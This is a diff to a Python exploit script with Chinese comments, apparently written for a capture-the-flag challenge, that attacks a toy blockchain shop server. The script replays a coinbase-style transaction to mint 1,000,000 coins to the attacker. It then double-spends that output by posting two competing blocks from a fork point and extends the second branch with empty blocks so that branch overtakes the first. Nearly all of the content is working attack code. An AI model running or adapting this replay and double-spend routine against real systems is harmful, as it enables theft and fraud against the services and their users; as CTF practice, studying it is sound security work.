@@ -125,15 +125,8 @@ if __name__ == '__main__':
             attacked_block = b
             break
 
-    # 找到创世区块（height=0）
-    # for b in blocks.values():
-    #     if b['height'] == 0:
-    #         genesis_block = b
-    #         break
-
     # 重放tx，改output为1000000到my_address
     replayed_tx = json.loads(json.dumps(attacked_block['transactions'][0]))  # 深拷贝
-    # replayed_tx = json.loads(json.dumps(genesis_block['transactions'][0]))  # 深拷贝
     replayed_tx['output'] = [create_output_utxo(my_address, 1000000)]
     replayed_tx['hash'] = hash_tx(replayed_tx)
     print("重放tx准备好")
@@ -169,22 +162,10 @@ if __name__ == '__main__':
         prev = empty_block['hash']
 
     # 获取我的UTXO id
-    # s = requests.Session()
     text = s.get(url_base + '/').text
     _, _, _, _, blocks, utxos = parse_home(text)
     utxo_to_double_spend = next(id for id, u in utxos.items() if u['addr'] == my_address and u['amount'] == 1000000)
     print(f"我的UTXO id: {utxo_to_double_spend}")
-
-    # 调试：打印所有UTXO
-    # print("当前所有UTXO:")
-    # for id, u in utxos.items():
-    #     print(f"  ID: {id}, 地址: {u['addr']}, 金额: {u['amount']}")
-    
-    # try:
-    #     utxo_to_double_spend = next(id for id, u in utxos.items() if u['addr'] == my_address and u['amount'] == 1000000)
-    #     print(f"我的UTXO id: {utxo_to_double_spend}")
-    # except StopIteration:
-    #     print("未找到金额为1000000的我的UTXO，继续检查其他逻辑...")
     
 
     # 记录买前prev（用于后续分叉）
@@ -193,7 +174,7 @@ if __name__ == '__main__':
     # Step 2: 买第一颗钻石
     output_to_shop = create_output_utxo(shop_address, 1000000)
     tx_to_shop1 = create_tx([utxo_to_double_spend], [output_to_shop], my_privkey)
-    spend_block1 = mine_block(fork_point_prev, [tx_to_shop1])  # 注意: prev是fork_point，但等下会reorg? No, 这里是继续主链
+    spend_block1 = mine_block(fork_point_prev, [tx_to_shop1]) 
     r = s.post(url_base + '/create_transaction', data=json.dumps(spend_block1))
     print("第一笔转账: ", r.text)  # server会给diamond1，并追加cold块
 
@@ -203,7 +184,7 @@ if __name__ == '__main__':
     tx_to_shop2 = create_tx([utxo_to_double_spend], [output_to_shop], my_privkey)
     spend_block2 = mine_block(fork_point_prev, [tx_to_shop2], nonce_prefix='another-chain-nonce-')
     r = s.post(url_base + '/create_transaction', data=json.dumps(spend_block2))
-    print("第二笔转账: ", r.text)  # server给diamond2，追加cold块
+    print("第二笔转账: ", r.text)
 
     # # 刷新获取新tail（cold块后）
     # text = s.get(url_base + '/').text
@@ -218,9 +199,9 @@ if __name__ == '__main__':
     #     print(f"额外空块{i+1}: ", r.text)
     #     prev = empty_block['hash']
 
-    # 直接用第二条分支尾部延长，使其高度反超第一条链（≥6）
+    # 直接用第二条分支尾部延长，使其高度反超第一条链
     prev = spend_block2['hash']
-    for i in range(3):  # 至少 3 个空块
+    for i in range(2):  # 至少 2 个空块
         empty_block = mine_block(prev, [])
         r = s.post(url_base + '/create_transaction', data=json.dumps(empty_block))
         print(f"反超空块{i+1}: ", r.text)
